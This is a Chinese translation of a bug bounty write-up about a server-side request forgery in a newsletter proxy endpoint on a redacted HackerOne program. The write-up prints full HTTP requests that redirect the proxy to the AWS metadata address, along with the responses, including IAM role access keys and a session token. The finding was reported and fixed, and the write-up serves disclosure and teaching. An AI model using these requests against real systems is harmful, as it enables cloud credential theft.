# 一个关于我第一只完整的 SSRF 虫的故事

> 原文：<https://infosecwriteups.com/a-tale-of-my-first-ever-full-ssrf-bug-4fe71a76e9c4?source=collection_archive---------0----------------------->

在对一些公共项目的 web 应用程序进行了几周徒劳的搜索和探索之后，我决定休息一下，带着一个全新的想法回来。在本文中，我将探索一个服务器端请求伪造漏洞，它使我能够无限制地访问程序的实例元数据环境。这个 bug 可能将程序的 Aws 访问密钥泄露给了攻击者。这是我开始捕虫之旅以来最有趣的发现。

![](img/f80a537ba0af22dd7d0eae72788c7f20.png)

我在 HackerOne 程序目录中寻找一个可以攻击的目标，这时我决定选择 redacted。(这个程序很友好，让我写这篇文章，条件是我要做相关的修订)。

浏览他们的政策页面把我带到了子域[https://collate.redacted.com/](https://redacted.redacted.com/)，我开始探索相关的功能。乍一看，似乎没有什么特别有趣的，但滚动到主页底部会显示一个文本框，网站访问者可以在其中提交他们的电子邮件地址，以订阅该公司的时事通讯。不要太花哨，对吗？我有一种直觉，想尝试了解在电子邮件提交过程中后台正在发出什么样的请求，所以我启动了 burpsuite，在文本框中键入我的电子邮件地址，然后单击提交。

这时事情开始变得有趣起来，因为 burpsuite 中的请求显示，电子邮件正通过代理端点被路由到内部邮件列表。(从网址的结构来看，我可以断定它是 MailChimp)。该电子邮件地址已通过以下 post 请求提交到后端

```
POST /cloud-app/api/proxy-post?url=https%3A%2F%2Fredacted.eu11.list-manage.com%2Fsubscribe%2Fpost%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 
Host: collate.redacted.com 
Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 
Content-Type: application/x-www-form-urlencoded 
Accept: */* Origin: http://collate.redacted.com 
Referer: http://collate.redacted.com/cloud-app 
Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
Connection: closeb_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=foobar@gmail.com
```

这是 URL 参数解码后的样子

`?url=[https://redacted.eu11.list-manage.com/subscribe/post?u=65bd5a1857b73643aad556093](https://redacted.eu11.list-manage.com/subscribe/post?u=65bd5a1857b73643aad556093&amp;id=934e9ffdc5)`

使用来自我的 burp collaborator 客户机的有效负载修改上述请求中的 URL 参数导致服务器向所提供的 collaborator URL 发出 HTTP 请求。这证实了我的预感，即该应用程序容易受到 SSRF 的攻击。

然后，我试图检查我是否能够做一些进一步的内部服务枚举或读取本地文件，但没有运气。我也试过各种协议比如***【gopher://******file://******LDAP://***或者 ***FTP://*** 。不幸的是，这些不被支持，使得 ***http://*** 和 ***https://*** 成为仅有的两个可用选项。

最后，我将 URL 参数指向 https://169 . 254 . 169 . 254/latest/user-data，这样我就可以尝试访问应用程序的云元数据环境。我拒绝了这个请求，然后嘣！，我收到了带有一些 Amazon **EC2 实例**元数据的响应。(注意从 post 到 get 请求的变化)。

```
GET /cloud-app/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2Flatest/user-data%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 
Host: collate.redacted.com 
Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 
Content-Type: application/x-www-form-urlencoded 
Accept: */* Origin: http://collate.redacted.com 
Referer: http://collate.redacted.com/cloud-app 
Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
Connection: closeb_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=foobar@gmail.com
```

反应

```
HTTP/1.1 200 OK 
Date: Sun, 17 May 2020 06:59:20 GMT 
Content-Type: text/html; charset=utf-8 
Content-Length: 66 
Connection: close 
Set-Cookie: AWSALB=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 06:59:20 GMT; Path=/ 
Set-Cookie: AWSALBCORS=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 06:59:20 GMT; Path=/; SameSite=None X-DNS-Prefetch-Control: off 
X-Frame-Options: SAMEORIGIN 
Strict-Transport-Security: max-age=15552000; 
includeSubDomains 
X-Download-Options: noopen 
X-Content-Type-Options: nosniff 
X-XSS-Protection: 1; mode=block 
ETag: W/”42-TCtERKSIzlhv3bS2BY0KADPY5wI” 
Vary: Accept-Encoding #!/bin/bash echo ECS_CLUSTER=cloud-app >>/etc/ecs/ecs.config
```

快速浏览一下 [Swissky 的回购](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)让我经历了更多的 AWS 端点。通过下面的请求访问 AWS 访问令牌后，就该写报告并提交报告了。

```
GET /cloud-app/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2F/latest/meta-data/iam/security-credentials/ecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 
Host: collate.redacted.com 
Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 
Content-Type: application/x-www-form-urlencoded 
Accept: */* Origin: http://collate.redacted.com 
Referer: http://collate.redacted.com/cloud-app 
Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
Connection: closeb_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=foobar@gmail.com
```

反应

```
HTTP/1.1 200 OK
Date: Sun, 17 May 2020 07:10:22 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Set-Cookie: AWSALB=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 07:10:22 GMT; Path=/
Set-Cookie: AWSALBCORS=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 07:10:22 GMT; Path=/; SameSite=None
X-DNS-Prefetch-Control: off
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
ETag: W/"51e-72BiEi+3aW7IjJYcC8EZFrrQfKQ"
Vary: Accept-Encoding
Content-Length: 1310{
"Code" : "Success",
"LastUpdated" : "2020-05-17T07:06:54Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "ASIAV6SVWBIP2VKA2AHR",
"SecretAccessKey" : "IC4L8G8VO0H16anm1Fw1FQKJY9IbyTkIE4dIbHUK",
"Token" : "IQoJb3JpZ2luX2VjEHAaCXVzLWVhc3QtMSJIMEYCIQD1lkZWbH1i1R1P8ijIQtkSYkykzY1ylbzVtfa4xt2h7gIhAKIFm9E98JfziETZSJL39G5NEGdsmftFOr0MrAFNg2GqKr0DCLj//////////wEQABoMNDA5Mjc1MzM3MjQ3IgxJCGj22YKawd4HhLUqkQMjg/WFZ5vCZH2BpJn8mPTR3L/p2QnTRyQyyHztHuLOX1JKH9/13ClgWXJSo+oSL+bPxt7cIfFg/dXCDVmhZGifCBh2aMpR8ENWct9kBfZI6ebU7EoXrjtIEZ0NH21kM7qLpHRLWuqNPoKpBTxHnXMt9kGSkvF6KjgcjveJDhJbpzodLMDMFWLd5Q1l/7a9aOTpDzydQVI69CBvzyhHXLm59s61/LFRyfulZaSQe78+BbEPlphj1EudDyXgbwfX/TH5M/r6n2SoA9/37uMFi671pcZUhf+YiWwHzi6tbWbA2UeGPpsNJjzTIWSGgUv8Je/+PIMDsD3zZbn9iVkBwrpfaHsEvg7VglrL9XDU+TYx7RtPjQM86KlvdSlp5Cm2XaMzMd4rcuADG1TpbaCcLJCScgfpPn1Hp1L9NMqdw0eCTRU09DEgIqntokqoCjQXxRYNHsloV7P0/Mv0OSzF0GTARMUBOYV7w6YR5M+Wed5xmWxBKWvKperSiseZaPtFMUBrLNv+CWvg4ZWi3CjqhfNg3DCWxYP2BTrqAVxRGw3KZLei6uiHAWkpSTHK7nJPzavBABylkMy18XkbgdrWB6LmqBX/EtKaXEDpcjb0fWjGCybaOEDuFoJRnMV2o1z05b3iciC06PGqPob0d0ZKqTmd5aB2rzbGA90U30nzk5BYrPA20vRXZdk4xIUZu3YbCYcMF80Fv0XIJPvU1I/n37kdkXN03x5K9SEX5DlH5qH/hZe1p+szm5AA8zjeXkSwX00E48NvwuXmlCF7zoyIg2fukOiBIwSzqCdgGBEjOQ0beAmMh8Dx/zledq/oCU0MpoVdtc2gNAiKqodPVz/17RoCMOKzng==",
"Expiration" : "2020-05-17T13:08:34Z"
}
```

在我提交报告的几个小时后，这个特性就被禁用了，因为项目工程师正在着手解决这个问题。

在接下来的几个月里，我获得了 1000 美元的奖金。

***时间轴:***

*2020 年 5 月 17 日—报道。*

*2020 年 5 月 18 日—分庭审理。*

*2020 年 5 月 18 日—功能禁用*

*2020 年 6 月 11 日——奖金发放*